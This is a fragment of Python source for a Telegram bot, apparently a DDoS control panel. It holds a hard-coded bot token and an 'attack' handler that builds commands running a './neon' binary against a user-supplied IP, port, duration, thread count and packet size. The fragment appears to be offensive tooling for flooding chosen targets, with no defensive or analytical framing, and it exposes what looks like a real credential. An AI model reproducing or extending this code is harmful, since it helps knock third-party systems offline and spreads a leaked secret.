...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7275036684:AAFQnebaNE0QFkmxk6Jrh457WtAcnTC63Qs'
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./neon {ip} {port} {duration} "
    elif argument_type == 4:
        attack_command = f"./neon {ip} {port} {duration} {threads} 20"
    elif argument_type == 5:
        attack_command = f"./neon {ip} {port} {duration} {byte_size} {threads} 20"
